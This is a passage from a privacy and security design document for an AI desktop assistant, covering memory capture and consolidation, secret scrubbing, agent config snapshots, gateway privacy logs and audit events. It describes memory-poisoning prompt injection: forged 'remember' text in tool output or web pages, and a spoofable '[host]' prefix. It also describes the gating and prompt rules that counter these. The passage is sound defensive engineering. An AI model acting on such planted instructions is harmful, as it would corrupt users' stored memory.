directly, items failing capacity or validation are archived, and items that
cannot form valid content are rejected. Each successful item leaves the
queue; **failed items stay for the next automatic retry**. Crash-reruns are
idempotent through kind + scope dedup. `memory_stats.review_pending`
therefore means only "how many legacy items have not migrated yet (a
technical retry count)"; it is not a human to-do list (the UI shows no
pending badge or task), and reaching zero only means no migration work
remains.

**Pre-PR semantic candidate shape adoption (PR #146 review fix).** Old
rows predate the `operation` / `evidence` fields (deserialization defaults
to `Add` / `UserAsserted`), so a semantic candidate's **only** marker is
`semantic_member_ids` — which is exactly what the old
`review::apply_review` used to decide "semantic" (land as Semantic +
backfill each member's `superseded_by`). The migration adapter adopts that
**exact legacy shape** (`kind=Fact` + member pointers + `Add` +
`UserAsserted`) as `Generalize` + `SemanticCluster`; without the adoption
the candidate goes down the Add path and degrades into an ordinary fact,
leaving the members permanently alive (still in the retrieval pool and the
index). Ordinary legacy facts (no member pointers) and explicit new
candidates (explicitly declaring a different operation / evidence) are
never converted — **online candidate adjudication is unaffected** (the
adapter runs only on the legacy migration path). The predicate looks at
field values rather than at whether the JSON carries those two keys:
migration-failed items are rewritten back into the queue (with the
explicit fields), so the next round must still adopt the same legacy
semantic candidate.

Member ownership uses `ownership_epoch`, independent of content versions, and durable exact `semantic_claims`. Members are persisted before old registrations are cleaned; retries reconcile the current authoritative state. Historical member ID sets do not authorize reattachment. Invalidated claims remain as content-free revocation facts, so automatic generalization into the same target cannot undo a user detach; explicit user relink/Replace remains available. Purge clears claims and all version-record content, retaining only content-free queue operation identities to reject old replays. This contract relies on the process-local `store::io_lock`, not a cross-process transaction.

**Narrow-path fallback (when no member is active).** After adoption, if the
candidate is rejected because *all* of its members are inactive (all
Archived / Tombstone / superseded by another entry) — with the reject code
**exactly** `generalize_no_valid_members` — the migration layer adjudicates
the **original** candidate (`Add` / `UserAsserted`) once more, so it lands as
an ordinary fact. The reason: a rejected candidate never enters the pending
set, and the final queue rewrite would therefore erase the candidate text
permanently; pre-PR kept the Semantic content, and before the shape
adoption the candidate merely degraded into an ordinary fact — neither path
loses content. The fallback predicate uses the reject code the adjudicator
**actually returned**, and does not copy `commit_generalize`'s member
liveness pre-check (copying it would drift from that validation); it fires
only when the shape was actually adopted this round and the reject code
matches exactly — every other reject code does not fall back.

**Semantic memory layer (2026-10-03).** At the end of each consolidation
run, active episodic entries are clustered (single-linkage, jaccard ≥
0.4); a cluster of ≥3 related entries not already covered by an existing
Semantic entry is distilled by the LLM into one piece of general
knowledge (at most 3 clusters per run — a quota guard). A legal semantic
candidate **enters the store directly as Semantic** (never queued): member
entries get a `superseded_by` back-pointer (generalization is not
replacement — episodic originals are never deleted and stay visible in
the timeline), and the semantic entry gets status=Semantic, never
decays, and scores with time_decay fixed at 1.0. Default search excludes
generalized members (the semantic entry speaks for them;
`include_archived` brings them back). LLM generalization uses exactly the
same outbound channel as consolidation extraction (BYOK / builtin /
Ollama alike), and the generalization prompt likewise forbids secrets and
requires JSON-only output.

**Explicit "remember" instructions (2026-10-01 hardening, three
layers).** When you explicitly say "remember: …" in chat, memory writes no
longer depend on consolidation timing or model initiative: ① a *pure*
instruction (the entire message is "remember: X") is intercepted locally by
the frontend — the text first passes the user-input guard (secret/PII
redaction, the same pass as the chat bubble) — and is then stored via the
`memory_capture_direct` command (zero LLM
turns, zero outbound traffic, no login/paid gate — pure local write);
② an *inline* instruction ("remember X, then do Y") runs a normal LLM turn,
but the `memory_add` write tool is **registered only on turns where remember
intent was detected** (the `memory_write_intent` gate) — on ordinary turns
the tool simply does not exist, so a forged "remember: …" inside tool output
or a web page cannot induce the model to write memory (injection-poisoning
defense; since 2026-10-08 IM channels register `memory_add` under the same
intent gate — IM is treated as an allowlist-trusted channel, and on ordinary
turns the tool is equally absent on both ends); ③ if the model
finishes an intent turn without calling `memory_add`, Rust falls back to
**writing the detector-stripped, scrubbed memory content directly, without model distillation** (keeping the "remember is
never silently lost" guarantee); the outcome is reported by a dedicated
`memory_fallback_completed` event carrying only `conversation_id` /
`memory_id` / `status` — **never any original text** — and an archived
outcome (rules at capacity) is stated as "archived, not active" in the
desktop bubble and the CLI confirmation, while a failed fallback only logs
a warning and emits no event (it never claims the memory was stored). The capture path
reuses consolidation's jaccard dedup: repeating "remember" on the same
content only reinforces the existing entry (salience +0.1) instead of
duplicating it; stored entries carry version-chain actor = User and reason
= explicit_remember. Intent detection (recall widened 2026-10-05) is
imperative-prefix matching (你记住 / 您记住 / 请记住 / 帮我记住 / 帮我记(一下/着) /
麻烦记住 / 别忘记 / 别忘了 / 记住 / 记一下 / please remember /
remember this / keep in mind / don't forget / do not forget / remember —
bare "remember" and "don't/do not forget" followed by "to " are tightened against self-reminder forms) plus the
whole-message inverted form "把 X 记住|记一下|记下". Since 2026-10-09 the
**second-person prefixes 你记住/您记住** are included (previously excluded
wholesale to reject the rhetorical "你记住了吗?" — which also rejected the
most common imperative form; real-world recall miss: a whole message
"你记住:X" missed all three detection layers), tightened by three guards:
a following "了" (rhetorical/declarative perfective), empty content after
stripping trailing particles ("你记住啊"), and no explicit separator plus a
statement-predicate ending ("你记住这个知识点很重要" is a topical
statement). In the same batch, "empty after stripping trailing particles"
became a universal rejection ("记住吧" no longer writes the single-character
garbage "吧"). A recall-widening
pass on 2026-10-08 added **clause-level scanning** — when the whole message
misses, it is split into clauses at sentence punctuation (。!?…;,,;!?.
and newlines), each clause start is matched against the same prefix table,
and clause-final imperative forms are recognized ("…,记住" / "这点记住" /
"把它记下来" / "…, remember this/that" / "don't forget this/that").
Clause-level hits are **always inline** (the turn enters the LLM loop and the
model distills with full context — no mechanical direct writes), guarded
against rhetorical/declarative forms ("你记住了吗" / "我记不住" /
"记住这个知识点很重要" / "do you remember this" / "i can't remember this"
do not match; "记到待办" still yields to the task gate). Detection runs only
on **your own message text** (never on tool output or model initiative), and
when the extracted content is a back-reference pronoun (这个/那条/它/this/
that) it is NOT written locally — the turn is routed inline so the model
resolves the referent from context. Task-shaped content ((一)个/条/项 +
待办/任务, or "待办: X" / "todo: X") makes the remember gate yield with a
no-match — the message falls back to the task intent gate / the LLM's
task_list create instead of being captured as a garbage memory entry
(2026-10-05; fixes "帮我记个待办" being swallowed into memory; the English
arm only matches singular task/todo — plural + colon, e.g. "remember tasks:
are due Friday", is a telegraphic statement subject and counts as legitimate
memory content).

**Dual-gate intent detection (2026-10-09).** The strict table above
(message/clause-anchored prefixes + guards) keeps exclusive ownership of the
two high-precision paths (pure direct write and the raw-text direct-write
fallback); a new **loose keyword gate** does exactly one thing — recall for
`memory_add` tool registration: imperative-leaning keywords (记住 / 别忘了 /
别忘记 / remember / keep in mind / don't forget — deliberately excluding
bare 「记得」/「记忆」) anywhere in your message register the tool, after
stripping first-person statements/completed forms (我记住了 / 我记不住 /
我记住啦 / i remember / i can't remember — deliberately NOT the bare
「我记住」, which would collateral-strip imperatives like 「让我记住」/
「你给我记住」), second-person rhetorical questions (你记住了 /
do you remember) and self-reminders
(remember to / forget to). Writes in a loose turn **also take effect
directly**: the loose gate only affects `memory_add` tool-registration
recall, never the storage outcome (the `review_only` mode and its "pending
confirmation" wording are gone; `ChatArgs.memory_write_review_only` remains
as a wire-compatibility field that no longer changes behaviour), and the
detector-stripped memory-content fallback is still NOT armed for loose turns (declarative sentences
would otherwise produce noise). The cost of a strict miss degrades from "the
whole pipeline silently fails" to "losing the zero-LLM-turn direct write and
falling back to a tooled LLM turn" — the write still lands. The keyword table and its test baseline are **single-sourced**
(`crates/kaya-core/data/remember_loose{,_cases}.json` — Rust and TS read
the same file and run the same cases, so editing the JSON is the only way to
change the table and the two sides cannot drift). Registration is still
driven only by your own message text ("remember" inside tool output cannot
trigger it), with identical semantics on desktop, IM, and the CLI.

**Consolidation input filtering and robustness (2026-10-01).** Extraction
input excludes host-synthesized system messages at the serialization layer
(msg ids prefixed `interaction-host-` / `grant-resume-` / `host-`; since
2026-10-04 this is an msg-id-only criterion: user messages of host turns
are persisted with a structural `host-` id prefix, while the `[host]`
content prefix — forgeable by an IM user to bypass memory extraction — is
no longer a criterion, with the "ignore [host] messages" prompt rule kept
as defense-in-depth) — system boilerplate can never be recorded as your
facts; the
extraction prompt explicitly forbids extracting keys/passwords/tokens/
certificates (credential facts record only where they live). Candidate
timestamps produced by the model that fall outside `[conversation creation,
now+5min]` (hallucinated old years / far future) are treated as parse
failures and fall back to the source message time. Long sessions are
extracted in 64KiB batches with the cursor persisted per batch; a single
oversized message is truncated but keeps its id — sessions can no longer
jam forever while repeatedly burning quota. No retroactive extraction on
first run (2026-10-02): when memory has never consolidated (no cursors),
existing conversations' cursors are seeded to their last message — prior
history is never extracted; memory starts from the moment the feature is
enabled, and only later increments enter consolidation. Consistency: the
memory IO lock
moved down into kaya-core (desktop commands, LLM tool hit write-backs, and
the CLI all share the same in-process lock), and month-shard writes are now
"re-read and merge by id" — in-process concurrent writers no longer
overwrite each other's entries; a cross-process (desktop ↔ CLI) race window
remains (the lock is in-process), which re-read-and-merge greatly reduces
but cannot fully eliminate.

**Write-side scrub funnel (2026-10-08; extended to automatic
adjudication 2026-10-28).** Explicit "remember" writes pass
Strict scrub at the single funnel point `capture::capture_direct` (the
memory_add tool / the `memory_capture_direct` command / CLI remember all
share this source): fragments matching a secret shape land as
`[REDACTED:*]` placeholders, and if the whole content collapses to a single
placeholder the write is refused (`content_redacted`; memory_add maps it to
a localized error, and the detector-stripped memory-content fallback goes through the same gate —
it is not re-queued). Since 2026-10-28 **every automatic write**
(`autonomy::commit_candidate`) passes the same content gate — trim →
Strict scrub → UTF-8-safe truncation — before anything is stored, and
app logs plus rejection reason short codes never carry candidate text; the
core-block renderer
(`render_core_block`) re-scrubs each entry once more with Strict before
injection as a backstop (covering all existing write paths such as
consolidation acceptance / review edits, ≤2KB per turn) — secret-shaped
text cannot be persisted into memory and then leak out on every turn.

**The outbound surface of retrieval and injection.** Stored memories leave
the machine at two moments (sent to the current provider along with the
conversation): ① the core memory block is an independent system context
message (fixed at index 1, ≤2KB, not charged against the system-prompt
byte budget) sent **every turn** — pinning to core means "carry this in
every conversation", **including turns on IM channels
(Feishu/WeCom/Slack) and remote sessions** (decided 2026-10-02: IM access
is allowlist-limited to you yourself, and the model may quote core memory
content in IM replies — this outbound surface is accepted deliberately;
since 2026-10-08 the memory retrieval tools are registered on IM too —
same trusted-channel policy, with output scrub applied, tombstones
invisible, and the raw-file subtree denial kept); ② the outputs of the
three memory retrieval tools
pass through **output scrub inside the tools** (secret/PII regexes +
whole-block PEM redaction run as usual — the same discipline as
terminal_read; fixed in the 2026-09-05 final review, which had previously
documented scrub as "applying automatically" without the tools actually
calling it).

**Deletion is forgetting.** No cloud sync means deletion is real: removing
the entire `~/.kaya/memory/` directory is complete forgetting — no copy
exists anywhere off this machine. Deletion has two tiers (since
2026-10-02): **Discard** is a logical delete — a tombstone keeps the
auditable trail (invisible to retrieval, lists, and injection) while the
content stays on disk; **Delete permanently** (in Settings → Memory, behind
a confirmation dialog) is content erasure — the entry's content and the
content of **all its historical versions** are replaced with `[purged]`,
unrecoverable, leaving only the entry id and version skeleton
(v/ts/actor/reason) as the audit record that a memory was deleted here. To
erase the skeleton as well, delete the corresponding files or the whole
directory. **Automatic lifecycles never delete physically (2026-10-28)**:
automatic adjudication only adds, reinforces, generalizes, archives and
backfills a reversible `superseded_by`; content erasure happens only through
your explicit actions (discard / delete permanently in Settings → Memory, or
deleting the files or the directory yourself).

**Transmission-side note (same convention as the §8 schedules note)**:
memory content is the user's own data; the core injection block and the
memory tool outputs reach the provider verbatim (scrub only redacts
secret/PII categories, it does not rewrite semantic content) — consistent
with the `task_list` / `schedule_manage` snapshot precedent.

### 8.2 The Agent Config Snapshot Domain (2026-10-15, spec §4/§7)

When the model library takes over a coding agent's configuration
(claude-code / kimi-code / opencode), kaya snapshots the original values
of exactly the keys kaya will touch — key by key — into
`~/.kaya/agent-config-snapshots/<agent_id>.json` on the **first hop that
takes over a non-kaya form**; on revocation (Revoke / unbind / entry
deletion / exit write-back / boot reconciliation all share this path) the
keys are restored according to ownership and current values, preserving later user edits. Unrestored originals follow the passive-backup rules below. **The active snapshot is consumed only after restoration or required backup completes reliably** (a failed restore keeps the snapshot
and logs a `snapshot_restore_failed:<agent>` warning, retried on the next
revocation).

- **Content rule (explicit exception)**: the snapshot contains the user's
  original values — including a self-configured third-party gateway's
  base_url / token (e.g. `ANTHROPIC_AUTH_TOKEN`). This is the **declared
  on-disk exception** to the "real keys never hit disk" rule: protection
  relies not on the keychain but on the `~/.kaya/` domain permissions
  (directory 0o700, file 0o600 atomic write — the same level as
  audit/debug).
- **Passive backup of unrestored originals**: if a displaced or per-key-flag path is absent or has been changed, keep its current state without guessing who deleted it. Only the original value displaced from that path is saved to `<agent>.unrestored.<uuid>.bak` in the same directory, using exclusive creation, mode 0600 and read-back verification. The active snapshot is consumed only after that backup is reliable; failure retains it and reports `snapshot_restore_failed:<agent>` for retry. The backup stays local, does not participate in ownership tracing or automatic boot restoration, is excluded from diagnostic exports, and has no automatic cleanup period. Users may delete it manually. It does not collect additional current config content.
- **Never refreshed under the kaya form**: repeat apply / force_apply /
  form migrations never overwrite the snapshot — it is always anchored to
  the user state from before kaya first touched the config.
- **The `snapshot_missing` placeholder**: for existing users upgrading in
  place, the pre-takeover state is unknowable, so a
  `{"snapshot_missing": true}` placeholder is written. Revocation removes
  managed keys whose originals are unknown, without fabricating values,
  and emits a one-time `snapshot_missing:<agent>` warning. Any original
  user sections subsequently captured by a v2 snapshot are still restored
  and verified before that snapshot is removed.
- **Zero content in logs/audit**: snapshot events
  (`agent_config_snapshot_taken` / `agent_config_snapshot_restored` /
  `snapshot_missing` / `snapshot_restore_failed`) carry only agent_id +
  key count + path — **never key values**; snapshot contents never reach
  any log or the audit trail.
- **OAuth tokens are outside the snapshot domain (2026-10-17, Phase 3)**:
  snapshots cover only the agent config keys kaya touches; OAuth access /
  refresh tokens live solely in the system keychain (§8, separate logical
  key), are never written into agent config, and are therefore never
  captured by a snapshot — takeover / revocation / restore never touches a
  token.

### 8.3 The Generic Agent Config Optimization Domain (2026-10-21, spec §8)

The privacy rules for the "analyze config → suggestion card → tick items →
one-shot authorization → write + read-back verification" loop (the six
rules of spec §8, one by one):

1. **Values carried by the suggestion card / the event are always
   double-masked** (key-name sensitive-word list + secret scrub), the same
   way as `agent_config action="read"` — the user never sees less than the
   model does, and never more. Implemented by
   `agents/config.rs::mask_json_secrets` + `llm/scrub.rs::scrub_text`.
   The key-name layer applies **only to keys explicitly marked
   `sensitive`**: the optimizable keys' value domains are bounded
   (integer / boolean / enum), and a substring heuristic like "the leaf
   name contains token" would misclassify `model_auto_compact_token_limit`
   (a token *count*) as a credential — it would then be unusable and would
   even be displayed as `***`. A credential-bearing key must be marked
   `sensitive: true` in the whitelist table.
   The masking tier is always Strict (the same tier `agent_config_analyze`
   uses in its `mode="inspect"` branch) — a laxer user tier would let the
   user see more than the model.
2. **The audit trail records key names and counts only**: the events
   `config-optimize-proposed` / `config-optimize-granted` /
   `config-optimize-applied` / `config-optimize-rolled-back` /
   `config-optimize-apply-failed` / `config-optimize-undone` are written to
   the **audit JSONL** of
   the same session (not only to app_log); the payload contains the
   agent_id, the proposal_id, the item counts and the **key names** —
   values never enter the audit trail, app_log, or the LLM context.
   **Masked values are persisted with the message stream**: the
   suggestion card and the analysis report enter the chat history as
   messages, so the Strict-tier masked current values land in
   localStorage together with `messages` (same lifetime as any other chat
   message) — what is persisted is the masked form, never the raw value.
3. **The authorization is one-shot, bound to the proposal hash, and burned
   on use**: it lives in memory (cleared on process restart) and is bound
   to `proposal_id` + a hash of the ticked subset. `ConfigEditGrantStore`
   is deliberately **not** reused (its session-level key-set granularity is
   too coarse).
4. **The denied-key tables are unchanged; this feature opens no new write
   surface**: the writable-key whitelist (model behaviour / resource keys
   only) is data, and denied keys (execution / privilege-escalation /
   model-identity / dangerous env vars) are routed to the "needs manual
   action" group and never enter the authorizable set.
5. **The config content in the LLM context is already masked**:
   `agent_config_analyze` (`mode="inspect"`) only returns the current
   values of the keys on the writable whitelist (other keys — especially
   provider credentials — never reach the model) and they are masked.
6. **The inspect tool is read-only and sends nothing out; the proposal
   validation is network-free**: `agent_config_analyze`'s `mode="inspect"`
   writes nothing, authorizes nothing, emits no event; `mode="propose"`
   runs the validator and emits a card without writing anything either;
   the validator is a pure function (the current
   state / the metadata / the tune status are all injected by the caller).
   **`parse ` / `read ` errors have source text stripped; other errors are
   passed through under a value-free contract**: toml's error Display prints
   the offending line verbatim (config files often contain a plaintext
   `api_key`) — both tool layers (agent_config / agent_config_analyze) pass
   errors through `agents/config.rs::sanitize_config_read_error`. It reduces
   only those two prefixes to "category + path"; other errors, such as the
   denied-key / model-identity / dangerous-env guidance, remain intact rather
   than being indiscriminately flattened. This is not a claim that every error
   string is sanitized: the boundary requires every newly constructed error in
   `agents/config.rs` to remain value-free (no config values; paths, key names,
   OS error text and fixed guidance are allowed), and callers must pass errors
   through this function before they reach the model.

**Pre-write backup and rollback**: writes go through
`agents/config.rs::write_with_backup` (a sibling `<file>.bak` + a 0o600
atomic write); `config_snapshot` is deliberately **not** reused (its key
set is fixed, and the boot orphan reconciliation would roll back the
snapshot of an agent that is not under takeover). A failed read-back
verification restores the file from the `.bak` (via `write_atomic`, which
does not produce a second-generation `.bak`).
**The undo requires the "applied receipt"** (proposal_id → path + backup hash + post-write file hash, process-local state, carrying no config value): without a receipt
the undo is refused — otherwise a `.bak` left behind by a *different*
writer would be restored over the user's config. The receipt is
process-local, so **after an app restart the undo button is disabled**
(the card stays, the undo does not). If the backup or current config changed after optimization, undo is refused to preserve later edits. A newly created file may only be removed while its post-write hash still matches. **The audit trail records
only "a rollback happened" and the counts, never content**; when the
verification fails **and** the rollback fails too, a separate
`config-optimize-apply-failed` event is written — it must not be folded
into "applied".

**Phase 2 semantic confirmation**: when a written key maps to a status-line
dimension (`status_dimensions` in the catalog, data layer), the interaction
watcher's parse of the agent's status line flips the card to "in effect".
A parse miss is **not a failure** (the user has not restarted the agent
yet): the card stays "pending effect confirmation" and flips to
"unconfirmed" after the timeout — **an unconfirmed effect is not a failed
write**, so nothing is rolled back automatically; the user decides.

### 8.4 Gateway Privacy-Protection Records (2026-10-21, the second documented on-disk content exception)

The model gateway's tokenization records (effective timing / agent / route /
category / action / **original text** / replacement token / restore count /
occurrence count) are written to
`~/.kaya/gateway/privacy-events.jsonl` (0o600, a 90-day query window / a
5000-record tokenized cap plus a separate 500-record warned cap, with "clear
current filter" and "clear all" in Settings).
Ninety days is a query filter: physical removal of expired originals and
patches happens during compaction or explicit clearing, without a scheduled
wipe.
**Write and eviction cadence (2026-11)**: the hits of one gateway request are
written **in a single batch** (one global lock and one file open for the append itself) instead of one
append per hit, and eviction when a pool is full happens **in batches** too:
500 tokenized records or 50 warned records at a time, so the freed headroom
keeps later appends from rewriting the whole file (the previous per-hit path
re-read the whole file and rewrote it atomically for every hit once a pool
was full, which saturated the blocking thread pool and kept keyboard writes
from being scheduled). The eviction order (expired → older records that
already have a newer copy of the same identity → FIFO), the two pool caps, the
90-day window and the persisted content (originals / tokens / diagnostic
dimensions) are unchanged. Batch eviction makes occupancy near capacity vary
between 4500–5000 tokenized records and 450–500 warned records (4501 / 451
after a single append that triggers eviction). Expiry cleanup, a pool not yet
at capacity, or an explicit clear can leave fewer records; these ranges are not
unconditional lower bounds. Restore patches for one response are also appended
as a batch under one lock with one file open, preserving per-token counts and
request_id links. When
one request produces more hits than a pool can hold, the pool keeps its
**newest** records up to its cap (the cap is a hard bound).
A failed batch append may already have persisted a prefix of complete records.
The original error is returned and both cached pool counts for that directory are
invalidated. Before the next append, counts are rebuilt from the records actually
on disk and eviction is checked again, so resumed writes cannot exceed either cap.
Within one request, repeated hits of the same identity are coalesced into one
record with an accumulated `occurrences` count (since 2026-10-26 the identity
key has **nine dimensions**: agent / route / category / action / content_kind /
decision_reason / app_version / protocol + content — the same content under a
different content kind or decision reason is a separate row, otherwise
dimension-filtered counts would be wrong). Since 2026-10-24, Settings
queries aggregate in memory by agent / route (including model) / category /
action / original, and return first-seen, last-seen, grouped-row count, and
raw-record count; aggregation adds no new persisted content.
Time windows select original hit records. Restore patches attach to the latest record with the same token,
including restores outside the selected window; these are linked-record totals, not restore-event-time totals.
Daily trends use the local calendar date. Invalid timestamps retain only a valid YYYY-MM-DD prefix;
otherwise they use `unknown`, remain in details/totals, and are skipped in trends.
Occurrences sum raw hits, unique content deduplicates category and original text, and list rows aggregate
full dimensions plus content. These counts differ. Agent chips and restore summaries remain visible.
Statistics show values only for the loaded current time window; errors retain filter options and expose
local-log inspection/clearing recovery. Read errors (including invalid UTF-8) are not cached as zero;
original data is retained without quarantine or deletion and later operations may retry.
`gateway_log_path` accepts only privacy/request/compatibility and returns a Rust-resolved absolute path. File checks
and platform opening run in a blocking worker; macOS waits for and reaps the child and checks exit status.
Missing files show “The log has not been generated yet.”
Since 2026-10-29, Settings shows all rule records by default and sorts them
**after aggregation and before pagination**: unmodified `warned` hits first,
then named secrets, validated PII, pattern PII, named rules (legacy), heuristic, then
unknown confidence, and finally tokenized records, with the most recent hit first
within each tier. Legacy effective-confidence derivation is shared with filtering
and never infers a v2 subtype. `warned` means only **the original was not replaced
and the linked request must be checked**; it is not a claim that a leak occurred.
The compact table keeps only locating details. Full original/token values, raw
timestamp, field path, request ID, decision reason, and restore history appear only
after explicit expansion. The expanded row can open the local
`privacy-events.jsonl` through the fixed-filename Rust `gateway_open_log` command
(the system `open_path` on non-macOS); the request audit is collapsed by default and
can open `request-events.jsonl`. The command accepts no WebView path, adds no
permissions, and sends no log content over the network. macOS explicitly invokes
`/usr/bin/open -a TextEdit` because `.jsonl` need not have a default association.
Opening the log
hands its plaintext originals to the user's local editor; any synchronization by
that editor is outside kaya's control.
The record schema is **v2** since 2026-10-26 (`schema_version: 2`): nine
**optional** diagnostic fields (schema_version / request_id / app_version /
rule_version / protocol / field_path / content_kind / confidence /
decision_reason). Old rows without those keys still read back, the legacy
serialized shape is unchanged, and a `None` field writes no key. New
dimensions are **never inferred** for old records: filtering matches explicit
values only (the one exception is `confidence`, where an old row is split by
category — `entropy-string` maps to `heuristic`, everything else to `named`;
`named_secret` / `validated_pii` / `pattern_pii` match explicit values only).
The confidence vocabulary is `named` (legacy umbrella) / `named_secret` /
`validated_pii` / `pattern_pii` / `heuristic`, and an unknown filter value
fails closed (matches no record). `app_version` is **injected by the host
shell** (src-tauri's `CARGO_PKG_VERSION`, shared with request events;
kaya-core no longer reports its own crate version).
**Warned and tokenized records use separate pools**: observe-only hits are
orders of magnitude more numerous than tokenizations (especially the
high-entropy catch-all at strict), so warned records have their own **500**-row
cap (tokenized stays 5000). Both pools converge with the same eviction order,
evicting warned records must **not** push out tokenized history, and an
upgrade performs no startup sweep (old records just converge under the
existing rules). Category,
action, agent, model, rule-confidence, time-window, and original/token search
filters all run locally in Rust. Selective clearing reuses exactly the same
filter set, and the search query is part of the "non-empty filter" decision.
In the query result, `raw_total` is the **viewed raw-record count** (used only
for the "N raw records" summary), while `clearable_total` is the **clearable
record count** — it shares the actual delete predicate of `clear_filtered`
(dimensions plus the delete-side time window), and only the latter drives the
clear-confirmation count and the "clear current view" disablement. Under a
time window, records with an unparsable timestamp are visible but never
deleted, so the view may still contain records after a successful clear: the
UI re-queries with the current filters instead of locally assuming an empty
view. A missing (`NotFound`) or empty record file still returns an empty result.
Real read I/O failures, such as permission or path-type errors, must not be
collapsed into an empty result: `gateway_privacy_stats` and
`gateway_privacy_records` fail with the fixed, content-free sentinel
`privacy_read_failed`, without exposing the OS error, path, or file contents.
On a read failure, `gateway_privacy_clear` returns the same sentinel and stops
without creating directories or performing an atomic rewrite. Directory-creation
or atomic-write failures instead return the fixed, content-free sentinel
`privacy_write_failed`, likewise without exposing the OS error, path, or file
contents.
Time boundaries tolerate invalid values on the read side (that side is simply
unbounded), but the delete side rejects them: when `since` / `until` carries a
non-empty unparsable string, `gateway_privacy_clear` returns the fixed
sentinel `privacy_invalid_time_boundary:<since|until>` and deletes nothing —
otherwise `since=garbage` would read as "unbounded" and widen a selective
clear into a full clear / a clear across that dimension's whole time range
(`clear_filtered` itself is fail-closed too). In the eviction order, the
"same identity already has a newer copy" check counts the record **about to
be written** as the newest copy: replaying an existing identity at the
5000-unique-record cap evicts the on-disk old copy instead of FIFO-dropping
the oldest unique record; for a same-token replay the incoming token also
counts as surviving, so the evicted old copy's restore patch is never treated
as an orphan and the new copy inherits the restore count and timestamp. The
search query lives only in the in-memory
comparison of a single query: it is never persisted, never written to
app_log, and the filter's Debug output prints it as `<redacted>` (locked by a
test).
Record queries do not export originals to audit (the gateway-scrub
zero-content invariant is preserved), app_log, or debug dumps, and do not
automatically inject them into LLM context. Explicit desktop/CLI trusted
reads retain the existing authorization and output-scrub boundary. IM channel
turn read policy denies this directory, and peer tools have no file-read entry.
Token usage statistics (`~/.kaya/usage/`) record only counts plus
model/provider/agent identifiers — zero content.

**Content-free request event stream (2026-10-26, spec §10.2)**: alongside the
records, a second file `~/.kaya/gateway/request-events.jsonl` is written
(0o600, directory 0o700; 30-day query window / 20000-event cap, evicting the
oldest **1000** events in one batch when full, with expired rows physically
removed during that rewrite). Each event has exactly 17 structural keys:
schema_version (1) / request_id (uuid v4, locally random, not derived from
content) / ts / app_version / rule_version (`gateway-privacy-actions-v3`) /
agent / route_entry / protocol / stream / transformed_fields (**unique
field_path count, not a hit count**; anonymous hits count 1 each) /
category_counts (category → hit count) / existing_placeholders /
media_preserved / media_rejected (**0/1 per request**: the first failure
rejects the request) / restored_exact / outcome (completed / upstream_error /
client_aborted / media_rejected / tokenize_rejected / no_credential /
internal_error) /
upstream_status — structurally **no original text, token, full field path or
message body**, and the wire keys are locked by tests (`no_credential` = the
route has no usable credential — since 2026-10-27 a ChatGPT subscription route
missing its account identity forwards zero upstream requests). Exactly one event per
Content request entering `before_request`: `finish_once` is idempotent, an unfinished guard dropped early
(client disconnect) falls back to `client_aborted`, and the upstream status
is still carried; a write failure only logs a content-free warning and never
affects the model request. The Settings "request metrics" set (requests /
rewritten requests / upstream 4xx / exact restores) uses the same filters;
the **media filter** uses the short codes `preserved` / `rejected` / `none`
("did this request contain such a media field" — the first two can both
match; an unknown code fails closed and matches nothing), and metrics and
list are **the same source** (stats reuse the same `events` filter path).

**Content-free compatibility diagnostic events (2026-11-03; narrowed 2026-11-04)**:
when a rewrite would invalidate a malformed or otherwise non-eligible signed
thinking block, the local rejection also writes
`~/.kaya/gateway/compatibility-events.jsonl` (0o600, directory 0o700; 30-day
retention / 5000 events, evicting the oldest 500 in one batch and physically
removing expired rows during rewrite). Cold-start counts are cached only after
a successful read. An I/O or UTF-8 read error stops that append without caching
zero; once the file is readable again, it is recounted before capacity eviction.
Each event shares the request event's
request_id and has exactly 15 structural keys: schema_version / request_id / ts /
app_version / rule_version / agent / route_entry / protocol / field_path (a fixed
protocol path) / content_kind / category / action / decision_reason /
fallback_decision (`rejected_no_safe_fallback`) / retry_outcome (`not_attempted`).
It contains no original, token, truth, signature, base64, messages or upstream
error response, and it does not silently omit history, resend original content,
or upload diagnostics.
Eligible history bodies bypass scanning and do not produce these rejection events.
There is currently no production UI reader. The fixed-filename command
`gateway_open_log { kind: "compatibility" }` can open this file. Local terminal commands are
`open -a TextEdit ~/.kaya/gateway/compatibility-events.jsonl` on macOS and
`notepad "$env:USERPROFILE\.kaya\gateway\compatibility-events.jsonl"` in Windows
PowerShell. Before adding a UI consumer, verify that its fields match §8 of
the compatibility spec.

**Clear semantics**: `gateway_privacy_clear` has two paths — a
**selective clear** (any filter set) deletes only matching **record** rows and
leaves request and compatibility events untouched; an **empty filter** (a genuine
full clear) clears records, then request events, then compatibility events. A
failure in the second step returns `privacy_request_log_clear_failed`; a failure
in the third returns `privacy_compatibility_log_clear_failed`. Both are
**visible partial failures**: earlier clears are not rolled back, and the UI must
not claim either "all cleared" or "nothing cleared". The new dimensions
(content_kind / decision_reason / app_version / protocol) all take part in
`is_empty` and in the delete predicate, so a filter carrying them can never be
mistaken for an empty filter (which would degrade into a full clear).

**Switch relationship (stated plainly)**: request events, compatibility events
and privacy records **share the same internal `privacy` switch**
(`GatewayState::privacy_base_dir()`, always on in production; turning it off
stops all three). Spec §10.2 requires independent streams and retention budgets,
not an independent gate; if a user-facing "disable privacy logging" switch is
ever added, **the gates must be split first** — otherwise turning off records
would silently stop request events and the request-level denominator would
disappear. All three files (including the `.tmp` / `.bak` atomic-write variants)
are excluded from diagnostic export, so they never leave in a support bundle.

---

## 9. Audit Trail (Post-hoc Forensics)

Source: `src/lib/audit.ts` + `auditTypes.ts` + `auditEval.ts`

Each time a chat session starts, the front-end `recordEvent` writes events
to `~/.kaya/audit/s_<sessionId>/events-*.jsonl` (7 kinds defined, of which
`reasoning-chunk` is legacy — new sessions actually write the other 6):

1. `session-start` — session start (records `previousSessionId`, chain is
   traceable)
2. `user-input` — **scrubbed** input + raw byte count + redactions
3. `tool-call-decided` — policy / safety decision + stage + reason
4. `tool-call-completed` — execution result + redactions + error
5. `assistant-turn` — complete round of output + `systemPromptFingerprint` +
   `durationMs`
6. `reasoning-chunk` — streaming reasoning fragments (**legacy**: since
   round-114, reasoning is batched into the `assistant-turn.reasoning` field;
   this event is kept only for replaying old JSONL)
7. `error` — error events

`UserInputEvent.text` is the scrubbed text, **not** the raw input — the JSONL
file itself cannot leak secrets.

For messages carrying images, the `user-input` event records only the
`images: [{ mime, bytes }]` **metadata** (type and byte count) — the image
content itself never lands in the audit JSONL (2026-10-02, pasted images);
the debug capture's history filter serializes only role + content, so
`Message.images` never enters a debug dump (locked by the
`debug_history_filter_never_serializes_images` test). Neither layer contains
image bytes, which makes "no images in audit / export" structural.

